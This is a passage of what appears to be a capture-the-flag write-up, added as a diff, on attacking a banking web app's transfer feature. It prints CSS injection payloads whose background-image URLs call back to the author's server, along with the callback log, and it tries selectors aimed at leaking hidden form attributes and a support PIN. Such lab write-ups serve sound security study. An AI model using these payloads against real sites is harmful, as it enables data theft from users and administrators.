@@ -398,3 +398,68 @@ Upgrade-Insecure-Requests: 1
 
 target_account=2&amount=10.00
 ```
+
+Naturally I tried changing the target account from 2 to 1, but get the message
+
+```
+Transfer recipient and sender cannot be the same
+```
+
+There's something interesting about that javascript, specifically this bit
+
+```javascript
+$('.transfer-btn').click( function(){
+    $('form#transfer_frm input[name="transfer_action"]').val( $(this).attr('data-action') );
+    $('form#transfer_frm input[name="transfer_id"]').val( $(this).attr('data-id') );
+    $('form#transfer_frm input[name="transfer_hash"]').val( $(this).attr('data-hash') );
+    $('form#transfer_frm').submit();
+});
+```
+
+So it's referencing some transfer_frm which doesn't exist prior to a transfer but does immediately after. After the transfer I can observer this form in the HTML
+
+```html
+<form method="post" id="transfer_frm">
+    <input type="hidden" name="transfer_action" value="">
+    <input type="hidden" name="transfer_id" value="">
+    <input type="hidden" name="transfer_hash" value="">
+</form>
+```
+
+So there's some further parameters against a POST request we can make to the page, and their values seem to be associated with the data-* attributes action, id and hash. I have no idea what these values could be.
+
+Now data attributes are just plain HTML attributes which are accessible from CSS. And I have a way of manipulating the CSS....
+
+So I tried with following payload
+
+```
+value=black; } .pull-right::before { background-image: url('http://x.x.x.x:8081/hello');}
+```
+
+Where the blanked out IP is my VPS with simple python http server running on that port. I can see that logged from the remote server requesting that image I assume this is the admin who approves the transfer.
+
+```
+178.128.46.44 - - [15/Jul/2022 15:02:42] code 404, message File not found
+178.128.46.44 - - [15/Jul/2022 15:02:42] "GET /hello HTTP/1.1" 404 -
+```
+
+So ideally I'd be able to do something like this to get at those hidden data attributes
+
+```css
+background-image: url('http://x.x.x.x:8081/action?=' attr(data-action));
+```
+
+But this sort of concatenation seems invalid in the url css function.
+
+For starters I need to know if the admin even has access to these data-* attributes, quick adjustment to the payload to check for the existence of the transfer_frm.
+
+```
+value=black; } form#transfer_frm::before { background-image: url('http://x.x.x.x:8081/hello');}
+```
+
+And I get nothing. Perhaps the data-* attributes are a dead end?
+
+This is definately along the right lines so just some further notes of successes, the following payloads trigger interactions with my VPS after a transfer
+
+- ```value=black; } div#supportModal input[name="pin_1"] { background-image: url('http://x.x.x.x:8081/hello');}``` ok the support modal is obviously visibile to the user after a transfer. But I haven't seen anywhere the support pin can be used.
+- ```value=black; } html body div.container div.row div.col-md-10.col-md-offset-1 div.panel.panel-default div.panel-heading div strong{ background-image: url('http://x.x.x.x:8081/hello');}``` so this is the selector to the strong elements of the page which are wrapped around the account name, sort code and account number. But CSS can't get the content of these.
